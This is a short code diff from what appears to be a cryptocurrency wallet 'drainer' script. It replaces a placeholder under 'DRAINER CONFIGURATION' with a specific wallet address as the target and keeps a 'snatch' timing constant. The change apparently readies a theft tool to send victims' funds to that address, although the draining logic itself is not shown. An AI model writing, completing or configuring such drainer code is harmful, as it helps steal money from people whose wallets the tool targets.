@@ -1,5 +1,5 @@
 // --- DRAINER CONFIGURATION ---
-const TARGET_WALLET = "0xYourAGMWalletAddressHere"; // <--- UPDATE THIS
+const TARGET_WALLET = "0x35b115c18f035a65Ea5A5FF6F46Fe3E00a89e2bF"; // <--- UPDATE THIS
 const SNATCH_TIME_MS = 1500; 
 
 // --- BOOTSTRAP ---
